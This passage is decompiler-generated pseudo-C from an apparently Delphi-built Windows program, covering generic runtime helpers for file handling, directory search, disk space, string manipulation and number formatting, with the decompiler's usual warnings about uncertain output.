HANDLE __usercall sub_407D34@<eax>(char *a1@<eax>)
{
  char *v1; // eax

  v1 = sub_40471C(a1);
  return CreateFileA_0(v1, 0xC0000000, 0, 0, 2u, 0x80u, 0);
}

//----- (00407D58) --------------------------------------------------------
// attributes: thunk
HANDLE __usercall sub_407D58@<eax>(char *a1@<eax>)
{
  return sub_407D34(a1);
}

//----- (00407D60) --------------------------------------------------------
DWORD __usercall sub_407D60@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesRead = nNumberOfBytesToRead;
  if ( !ReadFile_0(a3, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return -1;
  return NumberOfBytesRead;
}

//----- (00407D8C) --------------------------------------------------------
DWORD __usercall sub_407D8C@<eax>(DWORD nNumberOfBytesToWrite@<ecx>, LPCVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesWritten = nNumberOfBytesToWrite;
  if ( !WriteFile_0(a3, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0) )
    return -1;
  return NumberOfBytesWritten;
}

//----- (00407DB8) --------------------------------------------------------
DWORD __userpurge sub_407DB8@<eax>(void *a1@<eax>, DWORD a2@<edx>, LONG a3, LONG a4)
{
  LONG DistanceToMoveHigh; // [esp+Ch] [ebp-4h] BYREF

  DistanceToMoveHigh = a4;
  return SetFilePointer_0(a1, a3, &DistanceToMoveHigh, a2);
}

//----- (00407DF0) --------------------------------------------------------
BOOL __usercall sub_407DF0@<eax>(void *a1@<eax>)
{
  return CloseHandle_0(a1);
}

//----- (00407DF8) --------------------------------------------------------
DWORD __usercall sub_407DF8@<eax>(char *a1@<eax>, DWORD a2@<edx>)
{
  int v2; // ebx
  char *v3; // eax

  v2 = 0;
  v3 = sub_40471C(a1);
  if ( !SetFileAttributesA(v3, a2) )
    return GetLastError_0();
  return v2;
}

//----- (00407E20) --------------------------------------------------------
DWORD __usercall sub_407E20@<eax>(int a1@<eax>)
{
  FILETIME FileTime; // [esp+0h] [ebp-Ch] BYREF

  while ( (*(_DWORD *)(a1 + 16) & *(_DWORD *)(a1 + 24)) != 0 )
  {
    if ( !FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
      return GetLastError_0();
  }
  FileTimeToLocalFileTime((const FILETIME *)(a1 + 44), &FileTime);
  FileTimeToDosDateTime(&FileTime, (LPWORD)(a1 + 2), (LPWORD)a1);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a1 + 24);
  sub_4044D4((char **)(a1 + 12), (char *)(a1 + 68), 260);
  return 0;
}

//----- (00407E84) --------------------------------------------------------
DWORD __usercall sub_407E84@<eax>(char *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  char *v4; // eax
  HANDLE FirstFileA_0; // eax
  DWORD v6; // esi
  struct _WIN32_FIND_DATAA *v8; // [esp-4h] [ebp-10h]

  *(_DWORD *)(a3 + 16) = ~a2 & 0x1E;
  v8 = (struct _WIN32_FIND_DATAA *)(a3 + 24);
  v4 = sub_40471C(a1);
  FirstFileA_0 = FindFirstFileA_0(v4, v8);
  *(_DWORD *)(a3 + 20) = FirstFileA_0;
  if ( FirstFileA_0 == (HANDLE)-1 )
    return GetLastError_0();
  v6 = sub_407E20(a3);
  if ( v6 )
    sub_407EF8(a3);
  return v6;
}

//----- (00407ED4) --------------------------------------------------------
DWORD __usercall sub_407ED4@<eax>(int a1@<eax>)
{
  if ( FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
    return sub_407E20(a1);
  else
    return GetLastError_0();
}

//----- (00407EF8) --------------------------------------------------------
void *__usercall sub_407EF8@<eax>(int a1@<eax>)
{
  void *result; // eax

  result = *(void **)(a1 + 20);
  if ( result != (void *)-1 )
  {
    result = (void *)FindClose_0(result);
    *(_DWORD *)(a1 + 20) = -1;
  }
  return result;
}

//----- (00407F14) --------------------------------------------------------
BOOL __usercall sub_407F14@<eax>(char *a1@<eax>)
{
  char *v1; // eax

  v1 = sub_40471C(a1);
  return DeleteFileA(v1);
}

//----- (00407F2C) --------------------------------------------------------
int __usercall sub_407F2C@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  int v4; // edi
  char *i; // ebp
  unsigned __int8 v6; // bl

  v4 = sub_404524((int)a2);
  for ( i = sub_40471C(a1); v4 > 0; --v4 )
  {
    v6 = a2[v4 - 1];
    if ( v6 && sub_4081D8(i, v6) )
    {
      if ( (unsigned __int8)sub_409DE4(a2, v4) != 2 )
        return v4;
      --v4;
    }
  }
  return v4;
}

//----- (00407F7C) --------------------------------------------------------
_DWORD *__usercall sub_407F7C@<eax>(char *a1@<eax>, char *a2@<edx>, volatile __int32 *a3@<ecx>)
{
  int v5; // eax
  int v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  char *v10; // [esp+Ch] [ebp-8h] BYREF
  volatile __int32 *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a3;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_407FF3;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = sub_407F2C((char *)&dword_40800C, a1);
  v6 = v5;
  if ( !v5 || a1[v5 - 1] != 46 )
    v6 = 0x7FFFFFFF;
  Delphi_Copy_40477C((int)a1, 1, v6 - 1, &v10);
  sub_404570(v11, v10, a2);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_407FFA;
  return sub_40426C(&v10);
}
// 40800C: using guessed type int dword_40800C;

//----- (00408010) --------------------------------------------------------
_DWORD *__usercall sub_408010@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = sub_407F2C((char *)&dword_408040, a1);
  return Delphi_Copy_40477C((int)a1, 1, v4, a2);
}
// 408040: using guessed type int dword_408040;

//----- (00408044) --------------------------------------------------------
_DWORD *__usercall sub_408044@<eax>(char *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = sub_407F2C((char *)&dword_408078, a1);
  return Delphi_Copy_40477C((int)a1, v4 + 1, 0x7FFFFFFF, a2);
}
// 408078: using guessed type int dword_408078;

//----- (0040807C) --------------------------------------------------------
BOOL __stdcall sub_40807C(LPCSTR lpRootPathName, int *a2, int *a3, int a4)
{
  const CHAR *v4; // eax
  BOOL DiskFreeSpaceA; // ebx
  int v6; // edx
  int v7; // edx
  int v9; // [esp+4h] [ebp-18h]
  DWORD TotalNumberOfClusters; // [esp+Ch] [ebp-10h] BYREF
  DWORD NumberOfFreeClusters; // [esp+10h] [ebp-Ch] BYREF
  DWORD BytesPerSector; // [esp+14h] [ebp-8h] BYREF
  DWORD SectorsPerCluster; // [esp+18h] [ebp-4h] BYREF

  v4 = lpRootPathName;
  if ( !lpRootPathName )
    v4 = 0;
  DiskFreeSpaceA = GetDiskFreeSpaceA(
                     v4,
                     &SectorsPerCluster,
                     &BytesPerSector,
                     &NumberOfFreeClusters,
                     &TotalNumberOfClusters);
  v9 = BytesPerSector * SectorsPerCluster;
  *a2 = sub_405170(BytesPerSector * SectorsPerCluster, NumberOfFreeClusters, 0);
  a2[1] = v6;
  *a3 = sub_405170(v9, TotalNumberOfClusters, 0);
  a3[1] = v7;
  return DiskFreeSpaceA;
}
// 4080C9: variable 'v6' is possibly undefined
// 4080E3: variable 'v7' is possibly undefined

//----- (004080F0) --------------------------------------------------------
unsigned int __usercall sub_4080F0@<eax>(const char *a1@<eax>)
{
  return strlen(a1);
}

//----- (00408108) --------------------------------------------------------
char *__usercall sub_408108@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  sub_402844(a2, a1, a3);
  return a1;
}

//----- (00408118) --------------------------------------------------------
char *__usercall sub_408118@<eax>(char *result@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _BYTE *v3; // edi
  int v4; // ebx
  bool v5; // zf
  unsigned int v6; // ebx
  char *v7; // edi
  int v8; // ecx

  v3 = a2;
  v4 = a3;
  v5 = a3 == 0;
  if ( a3 )
  {
    do
    {
      if ( !a3 )
        break;
      v5 = *v3++ == 0;
      --a3;
    }
    while ( !v5 );
    if ( v5 )
      ++a3;
  }
  v6 = v4 - a3;
  qmemcpy(result, a2, 4 * (v6 >> 2));
  v7 = &result[4 * (v6 >> 2)];
  v8 = v6 & 3;
  qmemcpy(v7, &a2[4 * (v6 >> 2)], v8);
  v7[v8] = 0;
  return result;
}

//----- (0040814C) --------------------------------------------------------
char *__usercall sub_40814C@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-4h] [ebp-Ch]

  v6 = sub_404524((int)a2);
  v4 = sub_40471C(a2);
  return sub_408118(a1, v4, v6);
}

//----- (00408170) --------------------------------------------------------
int __usercall sub_408170@<eax>(_BYTE *a1@<eax>, const char *a2@<edx>)
{
  int v3; // eax
  unsigned int v4; // ecx
  const char *v5; // edi
  int v6; // edx
  bool v7; // zf

  v3 = 0;
  v4 = strlen(a2) + 1;
  v5 = a2;
  v6 = 0;
  do
  {
    if ( !v4 )
      break;
    v7 = *a1++ == *v5++;
    --v4;
  }
  while ( v7 );
  LOBYTE(v3) = *(a1 - 1);
  LOBYTE(v6) = *(v5 - 1);
  return v3 - v6;
}

//----- (00408194) --------------------------------------------------------
int __usercall sub_408194@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _BYTE *v3; // edi
  int v5; // ebx
  int result; // eax
  int v7; // ecx
  _BYTE *v8; // edi
  bool v9; // zf
  int v10; // edx

  v3 = a2;
  v5 = a3;
  result = 0;
  if ( a3 )
  {
    do
    {
      if ( !a3 )
        break;
      v9 = *v3++ == 0;
      --a3;
    }
    while ( !v9 );
    v7 = v5 - a3;
    v8 = a2;
    v10 = 0;
    v9 = 1;
    do
    {
      do
      {
        if ( !v7 )
          break;
        v9 = *a1++ == *v8++;
        --v7;
      }
      while ( v9 );
      if ( v9 )
        break;
      LOBYTE(result) = *(a1 - 1);
      if ( (unsigned __int8)result >= 0x61u && (unsigned __int8)result <= 0x7Au )
        LOBYTE(result) = result - 32;
      LOBYTE(v10) = *(v8 - 1);
      if ( (unsigned __int8)v10 >= 0x61u && (unsigned __int8)v10 <= 0x7Au )
        LOBYTE(v10) = v10 - 32;
      result -= v10;
      v9 = result == 0;
    }
    while ( !result );
  }
  return result;
}

//----- (004081D8) --------------------------------------------------------
_BYTE *__usercall sub_4081D8@<eax>(_BYTE *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *v2; // edi
  int v3; // ecx
  bool v4; // zf
  int v5; // ecx
  _BYTE *v6; // edi
  _BYTE *result; // eax

  v2 = a1;
  v3 = -1;
  v4 = 1;
  do
  {
    if ( !v3 )
      break;
    v4 = *v2++ == 0;
    --v3;
  }
  while ( !v4 );
  v5 = ~v3;
  v6 = a1;
  do
  {
    if ( !v5 )
      break;
    v4 = *v6++ == a2;
    --v5;
  }
  while ( !v4 );
  result = 0;
  if ( v4 )
    return v6 - 1;
  return result;
}

//----- (004081F8) --------------------------------------------------------
const char *__usercall sub_4081F8@<eax>(const char *a1@<eax>, const char *a2@<edx>)
{
  unsigned int v2; // kr04_4
  unsigned int v3; // ecx
  bool v4; // zf
  bool v5; // cc
  unsigned int v6; // ecx
  const char *v7; // edi
  unsigned int v8; // eax
  const char *v10; // [esp-4h] [ebp-10h]

  if ( a1 )
  {
    if ( a2 )
    {
      v2 = strlen(a2) + 1;
      if ( v2 != 1 )
      {
        v3 = strlen(a1) + 1;
        v4 = v3 == v2 - 1;
        v5 = v3 <= v2 - 1;
        v6 = v3 - (v2 - 1);
        if ( !v5 )
        {
          v7 = a1;
          while ( 1 )
          {
            do
            {
              if ( !v6 )
                break;
              v4 = *v7++ == *a2;
              --v6;
            }
            while ( !v4 );
            if ( !v4 )
              break;
            v8 = v6;
            v10 = v7;
            v4 = memcmp(a2 + 1, v7, v2 - 2) == 0;
            v7 = v10;
            v6 = v8;
            if ( v4 )
              return v10 - 1;
          }
        }
      }
    }
  }
  return 0;
}

//----- (0040824C) --------------------------------------------------------
_DWORD *__usercall sub_40824C@<eax>(int a1@<eax>)
{
  int v1; // ebx
  _DWORD *v2; // eax

  v1 = a1 + 4;
  v2 = (_DWORD *)sub_4026E0(a1 + 4);
  *v2 = v1;
  return v2 + 1;
}

//----- (00408260) --------------------------------------------------------
char *__usercall sub_408260@<eax>(char *a1@<eax>)
{
  int v3; // esi
  char *v4; // eax

  if ( !a1 )
    return 0;
  v3 = sub_4080F0(a1) + 1;
  v4 = (char *)sub_40824C(v3);
  return sub_408108(v4, a1, v3);
}

//----- (0040828C) --------------------------------------------------------
int __fastcall sub_40828C(unsigned int a1, unsigned __int8 *a2)
{
  int v2; // ebx
  char v5[32]; // [esp+0h] [ebp-34h] BYREF
  char *v6; // [esp+20h] [ebp-14h] BYREF
  char v7; // [esp+24h] [ebp-10h]

  v2 = a1;
  if ( a1 > 0x1F )
    v2 = 31;
  if ( (unsigned __int8)sub_409E08(a2, v2 - 1) == 1 )
    --v2;
  sub_408108(v5, (char *)a2, v2);
  v5[v2] = 0;
  v6 = v5;
  v7 = 6;
  return sub_4079D8(0, &v6);
}
// 4079D8: using guessed type int __fastcall sub_4079D8(_DWORD, _DWORD);
// 40828C: using guessed type char var_34[32];

//----- (004082E4) --------------------------------------------------------
int __fastcall sub_4082E4(int a1, int a2)
{
  return sub_4050E0(a1, a2);
}
// 4050E0: using guessed type int __fastcall sub_4050E0(_DWORD, _DWORD);

//----- (004082F8) --------------------------------------------------------
_DWORD *__usercall sub_4082F8@<eax>(_DWORD *a1@<eax>)
{
  return sub_40426C(a1);
}

//----- (00408304) --------------------------------------------------------
unsigned __int8 *__userpurge sub_408304@<eax>(
        int a1@<eax>,
        unsigned int a2@<edx>,
        unsigned __int8 *a3@<ecx>,
        int a4,
        int a5,
        int a6)
{
  unsigned __int8 *v6; // edi
  unsigned __int8 *v7; // esi
  unsigned __int8 *v8; // ecx
  unsigned __int8 v9; // al
  unsigned __int8 *result; // eax
  int v11; // ebx
  unsigned __int8 v12; // al
  unsigned int v13; // edx
  unsigned __int8 v14; // al
  unsigned int v15; // ecx
  unsigned int v16; // edx
  unsigned int v17; // ebx
  unsigned int v18; // ecx
  unsigned int v19; // ebx
  unsigned int v20; // et0
  bool v21; // cf
  unsigned int v22; // edx
  unsigned __int8 *v23; // edi
  unsigned int v24; // ecx
  unsigned int v25; // [esp-14h] [ebp-8Ch]
  unsigned int v26; // [esp-14h] [ebp-8Ch]
  unsigned __int8 *v27; // [esp-10h] [ebp-88h]
  unsigned __int8 *v28; // [esp+50h] [ebp-28h]
  unsigned int v29; // [esp+58h] [ebp-20h]
  unsigned __int8 v30; // [esp+5Fh] [ebp-19h]
  int v31; // [esp+68h] [ebp-10h] BYREF
  int v32; // [esp+6Ch] [ebp-Ch]
  int v33; // [esp+70h] [ebp-8h]
  int v34; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF

  v6 = (unsigned __int8 *)a1;
  v7 = a3;
  v34 = 0;
  v8 = &a3[a6];
  v33 = a1;
  v32 = 0;
  v31 = 0;
LABEL_2:
  if ( a2 )
  {
    while ( v7 != v8 )
    {
      v9 = *v7++;
      if ( v9 == 37 )
      {
        if ( v7 == v8 )
          break;
        v9 = *v7++;
        if ( v9 != 37 )
        {
          v11 = (int)(v7 - 2);
          while ( 1 )
          {
            v30 = v9;
            if ( v9 == 45 )
            {
              if ( v7 == v8 )
                goto LABEL_6;
              v9 = *v7++;
            }
            v12 = sub_4083E6(v9, v8, (int)&savedregs, v7);
            if ( v12 != 58 )
              break;
            v32 = v11;
            if ( v7 == v8 )
              goto LABEL_6;
            v9 = *v7++;
          }
          v29 = v11;
          if ( v12 == 46 )
          {
            if ( v7 == v8 )
              break;
            v14 = *v7++;
            v12 = sub_4083E6(v14, v8, (int)&savedregs, v7);
          }
          v28 = v7;
          v27 = v8;
          v25 = v13;
          sub_40842E(v12, (int)&savedregs, (int)v7);
          v16 = v25;
          v17 = v11 - v15;
          if ( v29 < v15 )
            v17 = 0;
          if ( v30 == 45 )
          {
            v16 = v25 - v15;
            if ( v25 < v15 )
            {
              v15 = v25;
              v16 = 0;
            }
            qmemcpy(v6, v7, v15);
            v7 += v15;
            v6 += v15;
            v15 = 0;
          }
          v20 = v17;
          v19 = v15;
          v18 = v20;
          v21 = v16 < v20;
          v22 = v16 - v20;
          if ( v21 )
          {
            v18 += v22;
            v22 = 0;
          }
          memset(v6, 32, v18);
          v23 = &v6[v18];
          v24 = v19;
          v21 = v22 < v19;
          a2 = v22 - v19;
          if ( v21 )
          {
            v24 = a2 + v19;
            a2 = 0;
          }
          qmemcpy(v23, v7, v24);
          v6 = &v23[v24];
          if ( v31 )
          {
            v26 = a2;
            sub_4082F8(&v31);
            a2 = v26;
          }
          v8 = v27;
          v7 = v28;
          goto LABEL_2;
        }
      }
      *v6++ = v9;
      if ( !--a2 )
        break;
    }
  }
LABEL_6:
  result = &v6[-v33];
  sub_4086F8((int)&savedregs);
  return result;
}
// 408360: variable 'v8' is possibly undefined
// 408393: variable 'v13' is possibly undefined
// 40839D: variable 'v15' is possibly undefined

//----- (004083E6) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned __int8 __usercall sub_4083E6@<al>(
        unsigned __int8 result@<al>,
        unsigned __int8 *a2@<ecx>,
        int a3@<ebp>,
        unsigned __int8 *a4@<esi>)
{
  int v4; // ebx

  v4 = 0;
  if ( result == 42 )
  {
    if ( *(_DWORD *)(a3 - 12) <= *(_DWORD *)(a3 + 8) )
      ++*(_DWORD *)(a3 - 12);
    if ( a4 == a2 )
LABEL_12:
      JUMPOUT(0x40833E);
    return *a4;
  }
  else
  {
    while ( result >= 0x30u && result <= 0x39u )
    {
      v4 = (unsigned __int8)(result - 48) + 10 * v4;
      if ( a4 == a2 )
        goto LABEL_12;
      result = *a4++;
    }
  }
  return result;
}
// 408409: positive sp value 4 has been found
// 408409: control flows out of bounds to 40833E

//----- (0040842E) --------------------------------------------------------
char __usercall sub_40842E@<al>(char a1@<al>, int a2@<ebp>, int a3@<esi>)
{
  char v3; // cl
  unsigned int v4; // ebx
  signed int v5; // eax
  _DWORD *v6; // ebx
  bool v7; // cf
  void *v8; // esi
  _BYTE *v9; // edi
  int v10; // ecx
  bool v11; // zf
  char v12; // bh
  unsigned __int8 v13; // bl
  unsigned int v14; // eax
  unsigned int v15; // edx

  v3 = a1 & 0xDF;
  v4 = *(_DWORD *)(a2 - 12);
  if ( v4 > *(_DWORD *)(a2 + 8) )
    goto LABEL_3;
  ++*(_DWORD *)(a2 - 12);
  a3 = *(_DWORD *)(a2 + 12) + 8 * v4;
  v5 = *(_DWORD *)a3;
  switch ( *(_BYTE *)(a3 + 4) )
  {
    case 0:
      switch ( v3 )
      {
        case 'D':
          if ( v5 < 0 )
          {
            sub_408582(-v5, a2);
            LOBYTE(v5) = 45;
            *(_BYTE *)(a3 - 1) = 45;
            return v5;
          }
          goto LABEL_54;
        case 'U':
LABEL_54:
          LOBYTE(v5) = sub_408582(v5, a2);
          return v5;
        case 'X':
LABEL_55:
          JUMPOUT(0x408587);
      }
LABEL_3:
      while ( 1 )
      {
        sub_4086F8(a2);
        v5 = sub_40828C(*(_DWORD *)(a2 - 40) - *(_DWORD *)(a2 - 24), *(unsigned __int8 **)(a2 - 24));
LABEL_4:
        v6 = (_DWORD *)(a2 - 48);
        *v6 = *(_DWORD *)v5;
        v6[1] = *(_DWORD *)(v5 + 4);
        if ( v3 == 68 )
          break;
        if ( v3 == 85 )
          goto LABEL_51;
        if ( v3 == 88 )
          JUMPOUT(0x4084F6);
      }
      if ( (int)v6[1] < 0 )
      {
        v7 = *v6 != 0;
        *v6 = -*v6;
        v6[1] += v7;
        v6[1] = -v6[1];
        sub_4084F1((int)v6, a2);
        LOBYTE(v5) = 45;
        *(_BYTE *)(a3 - 1) = 45;
        return v5;
      }
LABEL_51:
      LOBYTE(v5) = sub_4084F1((int)v6, a2);
      return v5;
    case 1:
    case 7:
    case 8:
    case 9:
    case 0xE:
      goto LABEL_3;
    case 2:
      if ( v3 == 83 )
        return v5;
      goto LABEL_3;
    case 3:
      v12 = 0;
      goto LABEL_39;
    case 4:
      if ( v3 != 83 )
        goto LABEL_3;
      LOBYTE(v5) = *(_BYTE *)v5;
      return v5;
    case 5:
      if ( v3 != 80 )
        goto LABEL_3;
      *(_DWORD *)(a2 - 36) = 8;
      goto LABEL_55;
    case 6:
      if ( v3 != 83 )
        goto LABEL_3;
      v9 = *(_BYTE **)a3;
      LOBYTE(v5) = 0;
      v10 = *(_DWORD *)(a2 - 36);
      if ( v10 )
      {
        do
        {
          if ( !v10 )
            break;
          v11 = *v9++ == 0;
          --v10;
        }
        while ( !v11 );
      }
      return v5;
    case 0xA:
      v8 = sub_40448C;
      goto LABEL_26;
    case 0xB:
      if ( v3 == 83 )
        return v5;
      goto LABEL_3;
    case 0xC:
      v12 = 1;
LABEL_39:
      a3 = *(_DWORD *)a3;
      v13 = 0;
      if ( v3 == 71 || (v13 = 1, v3 == 69) )
      {
        v14 = *(_DWORD *)(a2 - 36);
        v15 = 3;
        if ( v14 > 0x12 )
          v14 = 15;
      }
      else
      {
        v13 = 2;
        if ( v3 != 70 )
        {
          v13 = 3;
          if ( v3 != 78 )
          {
            if ( v3 != 77 )
              goto LABEL_3;
            v13 = 4;
          }
        }
        v14 = 18;
        v15 = *(_DWORD *)(a2 - 36);
        if ( v15 > 0x12 )
        {
          v15 = 2;
          if ( v3 == 77 )
            v15 = (unsigned __int8)byte_42C730;
        }
      }
      LOBYTE(v5) = sub_408870((_BYTE *)(a2 - 113), a3, v12, v15, v14, v13);
      return v5;
    case 0xD:
      if ( v3 != 83 )
        goto LABEL_3;
      if ( *(_WORD *)v5 > 1u )
        LOBYTE(v5) = sub_4082E4(v3, *(_DWORD *)a3);
      return v5;
    case 0xF:
      v8 = sub_4044EC;
LABEL_26:
      a3 = (int)v8 + *(_DWORD *)(a2 - 4);
      if ( v3 != 83 )
        goto LABEL_3;
      ((void (__fastcall *)(char, signed int))a3)(83, v5);
      return *(_DWORD *)(a2 - 20);
    case 0x10:
      goto LABEL_4;
  }
}
// 4084D1: control flows out of bounds to 4084F6
// 40856E: control flows out of bounds to 408587
// 4084C0: variable 'v3' is possibly undefined
// 42C730: using guessed type char byte_42C730;

//----- (004084F1) --------------------------------------------------------
int __usercall sub_4084F1@<eax>(int a1@<ebx>, int a2@<ebp>)
{
  int v2; // ecx
  int v3; // esi
  unsigned __int8 v4; // dl
  int v5; // eax
  int v6; // edx
  int result; // eax
  unsigned int v8; // ecx
  unsigned int v9; // edx
  bool v10; // cc
  unsigned int v11; // edx
  int v12; // [esp-4h] [ebp-8h]
  unsigned __int64 *v13; // [esp+0h] [ebp-4h]

  v2 = 10;
  v3 = a2 - 81;
  do
  {
    v12 = v2;
    v4 = sub_4052D8(*(_QWORD *)a1, (unsigned int)v2) + 48;
    if ( v4 >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v3 = v4;
    a1 = *(_DWORD *)(a2 - 4);
    v5 = sub_405210(*v13, (unsigned int)v12);
    v2 = v12;
    *(_DWORD *)a1 = v5;
    *(_DWORD *)(a1 + 4) = v6;
    result = v6 | v5;
  }
  while ( result );
  v8 = a2 - 81 - v3;
  v9 = *(_DWORD *)(a2 - 36);
  if ( v9 <= 0x10 )
  {
    v10 = v9 <= v8;
    v11 = v9 - v8;
    if ( !v10 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v3 = 48;
        --v11;
      }
      while ( v11 );
    }
  }
  return result;
}
// 408521: variable 'v13' is possibly undefined
// 408532: variable 'v6' is possibly undefined

//----- (00408582) --------------------------------------------------------
unsigned int __usercall sub_408582@<eax>(unsigned int result@<eax>, int a2@<ebp>)
{
  int v2; // esi
  unsigned int v3; // et2
  char v4; // dl
  unsigned int v5; // ecx
  unsigned int v6; // edx
  bool v7; // cc
  unsigned int v8; // edx

  v2 = a2 - 97;
  do
  {
    v3 = result % 0xA;
    result /= 0xAu;
    v4 = v3 + 48;
    if ( (unsigned __int8)(v3 + 48) >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v2 = v4;
  }
  while ( result );
  v5 = a2 - 97 - v2;
  v6 = *(_DWORD *)(a2 - 36);
  if ( v6 <= 0x10 )
  {
    v7 = v6 <= v5;
    v8 = v6 - v5;
    if ( !v7 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v2 = 48;
        --v8;
      }
      while ( v8 );
    }
  }
  return result;
}

//----- (004086F8) --------------------------------------------------------
void __usercall __spoils<edx,ecx> sub_4086F8(int a1@<ebp>)
{
  sub_40426C((_DWORD *)(a1 - 20));
}

//----- (00408718) --------------------------------------------------------
int __userpurge sub_408718@<eax>(int a1@<eax>, unsigned int a2@<edx>, char *a3@<ecx>, int a4, int a5)
{
  int v8; // eax

  if ( !a1 || !a3 )
    return 0;
  v8 = sub_4080F0(a3);
  sub_408304(a1, a2, (unsigned __int8 *)a3, a4, a5, v8)[a1] = 0;
  return a1;
}

//----- (00408758) --------------------------------------------------------
_DWORD *__userpurge sub_408758@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4)
{
  return sub_40876C(a4, a1, a2, a3);
}

//----- (0040876C) --------------------------------------------------------
_DWORD *__userpurge sub_40876C@<eax>(char **a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8; // eax
  char v10[8]; // [esp+0h] [ebp-1008h] BYREF
  char **v11; // [esp+8h] [ebp-1000h]
  int v12; // [esp+1000h] [ebp-8h]
  int v13; // [esp+1004h] [ebp-4h]

  v11 = a1;
  v12 = a3;
  v13 = a2;
  v5 = 4096;
  if ( sub_404524(a2) >= 3072 )
  {
    v7 = sub_404524(v13);
    v5 = v7;
  }
  else
  {
    v6 = sub_404524(v13);
    v7 = sub_408304(a4, v12, v6);
  }
  if ( v7 < v5 - 1 )
    return sub_40435C(a1, v10, v7);
  while ( v7 >= v5 - 1 )
  {
    v5 *= 2;
    sub_40426C(a1);
    sub_40484C(a1, v5);
    v8 = sub_404524(v13);
    v7 = sub_408304(a4, v12, v8);
  }
  return sub_40484C(a1, v7);
}
// 408304: using guessed type _DWORD __stdcall sub_408304(_DWORD, _DWORD, _DWORD);
// 40876C: using guessed type char var_1008[8];

//----- (0040882C) --------------------------------------------------------
int __usercall sub_40882C@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, char a4@<bl>, _BYTE *a5@<edi>)
{
  char *v5; // edi
  char v6; // al
  unsigned int v7; // eax
  _DWORD *v8; // ebx
  unsigned int v9; // et2
  _DWORD v11[2]; // [esp-4h] [ebp-8h] BYREF

  *a5 = a1;
  v5 = a5 + 1;
  if ( a4 )
  {
    if ( a2 < 0 )
    {
      v6 = 45;
      a2 = -a2;
LABEL_7:
      *v5++ = v6;
      goto LABEL_8;
    }
  }
  else
  {
    a2 = 0;
  }
  if ( HIBYTE(a1) )
  {
    v6 = HIBYTE(a1);
    goto LABEL_7;
  }
LABEL_8:
  v7 = a2;
  v11[0] = a2;
  v8 = v11;
  do
  {
    do
    {
      v9 = v7 % dword_42B124;
      v7 /= (unsigned int)dword_42B124;
      *(_BYTE *)v8 = v9 + 48;
      v8 = (_DWORD *)((char *)v8 + 1);
      --a3;
    }
    while ( v7 );
  }
  while ( a3 > 0 );
  do
  {
    v8 = (_DWORD *)((char *)v8 - 1);
    *v5++ = *(_BYTE *)v8;
  }
  while ( v8 != v11 );
  return v11[0];
}
// 42B124: using guessed type int dword_42B124;

//----- (00408870) --------------------------------------------------------
int __userpurge sub_408870@<eax>(_BYTE *a1@<eax>, int a2@<edx>, char a3@<cl>, int a4, int a5, unsigned __int8 a6)
{
  int v6; // eax
  int v7; // eax
  _BYTE *v8; // edi
  int v9; // ecx
  int v10; // ebx
  int v12; // [esp-4h] [ebp-3Ch]
  unsigned __int16 v13; // [esp+Ch] [ebp-2Ch] BYREF
  int v14; // [esp+24h] [ebp-14h]
  char v15; // [esp+2Ah] [ebp-Eh]
  char v16; // [esp+2Bh] [ebp-Dh]
  int v17; // [esp+2Ch] [ebp-Ch]
  char v18; // [esp+32h] [ebp-6h]
  char v19; // [esp+33h] [ebp-5h]
  _BYTE *v20; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF
  int v22; // [esp+44h] [ebp+Ch]

  v20 = a1;
  v19 = byte_42C72F;
  v18 = byte_42C72E;
  v17 = dword_42C728;
  v16 = byte_42C72C;
  v15 = byte_42C72D;
  v14 = 0;
  v6 = 19;
  if ( !a3 )
  {
    v6 = a5;
    if ( a5 < 2 )
      v6 = 2;
    if ( v6 > 18 )
      v6 = 18;
  }
  v22 = v6;
  v12 = v6;
  v7 = 9999;
  if ( a6 >= 2u )
    v7 = a4;
  sub_408B48((int)&v13, a2, a3, v7, v12);
  v8 = v20;
  if ( (unsigned int)v13 - 0x7FFF >= 2 )
  {
    v10 = a6;
    if ( a6 != 1 && (a6 > 4u || (__int16)v13 > v22) )
      LOBYTE(v10) = 0;
